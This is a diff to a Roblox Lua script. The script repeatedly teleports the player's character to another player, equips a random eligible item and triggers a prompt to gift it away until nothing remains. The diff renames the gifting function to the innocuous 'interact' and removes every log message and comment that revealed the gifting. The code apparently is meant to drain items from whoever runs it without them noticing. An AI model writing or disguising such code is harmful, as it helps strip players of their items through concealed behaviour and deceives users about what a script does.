@@ -38,22 +38,18 @@ local function getRecipient()
     return nil
 end
 
-local function fastGift(tool, targetPlayer)
+local function interact(tool, targetPlayer)
     local myRoot = Character:WaitForChild("HumanoidRootPart")
     local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     local prompt = targetRoot and targetRoot:FindFirstChildWhichIsA("ProximityPrompt", true)
     if not (targetRoot and prompt) then
-        warn("No prompt found on target player")
         return
     end
-
-    -- Unequip all tools before gifting
     for _, ctool in ipairs(Character:GetChildren()) do
         if ctool:IsA("Tool") then 
             ctool.Parent = Backpack 
         end
     end
-
     myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
     tool.Parent = Character
     task.wait(0.02)
@@ -67,28 +63,18 @@ local function fastGift(tool, targetPlayer)
     task.wait(0.02)
 end
 
-print("Starting random gifting loop...")
-
 while true do
     local items = getEligibleItems()
     if #items == 0 then
-        print("No more eligible items to gift!")
         break
     end
-
     local recipient = getRecipient()
     if not recipient then
-        print("No recipients found, aborting.")
         break
     end
-
-    -- Pick a random item each time
     local idx = math.random(1, #items)
     local tool = items[idx]
-    print("Attempting to gift:", tool.Name, "to", recipient.Name)
-
-    fastGift(tool, recipient)
-    -- Wait a tiny bit to avoid script flooding/roblox lag
+    interact(tool, recipient)
     task.wait(0.05)
 end
 
